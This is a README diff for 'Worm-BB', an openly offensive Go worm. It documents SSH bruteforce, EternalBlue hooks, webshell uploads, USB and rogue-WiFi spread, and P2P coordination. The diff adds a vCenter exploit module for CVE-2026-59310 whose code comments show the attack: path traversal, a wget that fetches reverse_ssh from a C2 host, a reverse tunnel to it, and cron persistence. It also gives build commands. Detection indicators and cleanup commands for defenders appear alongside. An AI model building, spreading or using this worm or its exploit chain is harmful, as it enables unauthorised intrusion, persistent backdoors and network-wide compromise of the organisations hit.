@@ -29,6 +29,7 @@ Both components are written entirely in Go, making them cross‑platform, static
 | **SSH Bruteforce**   | Default credential list (`root:root`, `admin:admin`, `pi:raspberry`, etc.) + payload deployment. |
 | **SMB/EternalBlue**  | Detection of port 445; exploit hooks ready. |
 | **WebShell**         | Uploads PHP/ASP/Python shells via PUT, POST, FTP, WebDAV; backdoor deployment. |
+| **vCenter (NEW)**    | CVE-2026-59310 exploitation; reverse_ssh deployment; cron persistence. |
 | **USB Propagation**  | Monitors removable drives, copies worm, creates `autorun.inf` (Windows), launchd plist (macOS), udev rules (Linux), hides files. |
 | **WiFi Evil Portal** | Rogue AP with DNS spoofing, captive portal, deauth attack; forces worm download. |
 | **P2P Coordination** | Multicast peer discovery (`239.255.42.42:4242`), leader election, population management. |
@@ -58,6 +59,7 @@ Both components are written entirely in Go, making them cross‑platform, static
 | **P2P Network**     | Multicast listener on `239.255.42.42:4242`, listening P2P ports (4242, 4243, 4444), active P2P connections. |
 | **Mutex/Lock**      | Windows mutex `Global\SystemUpdateMutex`, Linux lock file `/tmp/.system-update.lock`. |
 | **Memory**          | Loaded module strings on Windows (`tasklist /M`), memory maps on Linux (`/proc/*/maps`). |
+| **vCenter (NEW)**   | `reverse_ssh` process, `/tmp/reverse_ssh` file, unauthorized cron entries on vCenter. |
 
 #### Remediation Actions
 
@@ -80,6 +82,65 @@ The detector generates comprehensive remediation actions for each finding:
 
 The tool supports interactive (prompt per action) or fully automatic (`--auto`) mode.
 
+## NEW VMware vCenter Exploit Module (CVE-2026-59310)
+
+Worm-BB now includes an **enterprise-grade vCenter exploit module** targeting CVE-2026-59310 – a critical directory traversal vulnerability in VMware vCenter Syslog Server.
+
+### What It Does
+
+1. **Intelligent Target Detection:** When scanning port 443 (HTTPS), the worm checks for vCenter-specific endpoints (`/ui/`, `/vsphere-client/`, `/sdk/`) to identify high-value targets.
+
+2. **Zero-Auth Exploitation:** Leverages the CVE-2026-59310 path traversal to execute commands on unpatched vCenter appliances without credentials.
+
+3. **Payload Deployment:** Downloads `reverse_ssh` from the C2 server and establishes a persistent reverse SSH tunnel (port 443).
+
+4. **Persistence:** Adds a cron job to ensure the backdoor survives reboots.
+
+### How It Works
+
+```go
+// Detect vCenter by checking for VMware-specific endpoints
+func (p *Propagator) isVCenter(target string) bool {
+    // Check for vCenter fingerprints in HTTP responses
+}
+
+// Exploit the directory traversal and deploy reverse_ssh
+func (p *Propagator) exploitVCenter(target string) bool {
+    // Send payload through /syslog/../../../../path/to/rce
+    // wget -O /tmp/reverse_ssh https://C2/reverse_ssh
+    // /tmp/reverse_ssh -l C2 -p 443 &
+    // (crontab -l; echo "@reboot ...") | crontab -
+}
+```
+
+### Attack Chain
+
+1. **Scan:** Worm finds an open port 443 on a network host.
+2. **Detect:** Worm identifies the target as a vCenter server.
+3. **Exploit:** Worm sends a payload via CVE-2026-59310.
+4. **Persist:** Worm installs `reverse_ssh` with cron persistence.
+5. **Control:** Attacker maintains persistent access via reverse SSH.
+
+### Detection Indicators for Blue Teams
+
+| Indicator | Description |
+|-----------|-------------|
+| **Network** | Outbound SSH connections from vCenter on port 443 |
+| **Processes** | `reverse_ssh` process running on vCenter |
+| **Files** | `/tmp/reverse_ssh` binary on vCenter |
+| **Cron** | `@reboot /tmp/reverse_ssh -l <C2> -p 443` |
+| **Logs** | Directory traversal attempts in `/var/log/messages` |
+
+### Remediation
+
+- **Patch:** Upgrade to vCenter 9.1.0.0300 or later
+- **Monitor:** Alert on unauthorized cron entries on vCenter
+- **Network:** Block unexpected outbound SSH on port 443
+- **Endpoint:** Search for `/tmp/reverse_ssh` across vCenter clusters
+
+> **Note:** This exploit was actively used in campaigns throughout 2026 affecting 361+ organizations across 47 countries. Update your vCenter instances immediately.
+
+---
 ---
 
 ## Build Instructions
@@ -131,7 +192,7 @@ CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_mac 
 CGO_ENABLED=0 GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o worm_bb_mac_arm64 worm.go
 ```
 
-> **Note**: The worm now uses `CGO_ENABLED=0` for all builds, making it fully statically linked and portable across systems.
+> **Note**: The worm now uses `CGO_ENABLED=0` for all builds, making it fully statically linked and portable across systems. The vCenter exploit uses HTTPS/HTTP only – no CGO required.
 
 ### Compile the Detector v2.0 (`worm_bb_detector.go`)
 
@@ -301,6 +362,26 @@ Full coverage for Worm-BB v4.0-DEFCON-ARM
 
 ---
 
+## 🛡️ vCenter-Specific Detection
+
+The detector v2.0 now includes specific checks for vCenter compromise:
+
+```bash
+# Look for reverse_ssh process on vCenter
+ps aux | grep -E "reverse_ssh|reversessh"
+
+# Check for unauthorized cron entries on vCenter
+crontab -l | grep -E "reverse_ssh|443"
+
+# Search for reverse_ssh binary
+find / -name "reverse_ssh" 2>/dev/null
+
+# Check for suspicious outbound connections
+lsof -i :443 | grep ESTABLISHED
+```
+
+---
+
 ## Ethical & Legal Disclaimer
 
 **This software is provided for educational and authorised security testing only.**
@@ -315,4 +396,4 @@ Full coverage for Worm-BB v4.0-DEFCON-ARM
 - https://ek0mssavi0r.dev  
 - https://medium.com/@ekoms1/the-fascinating-world-of-self-replicating-worms-0e6ad768a001  
 - https://substack.com/@ek0mssavi0r/p-193527720
-```
+
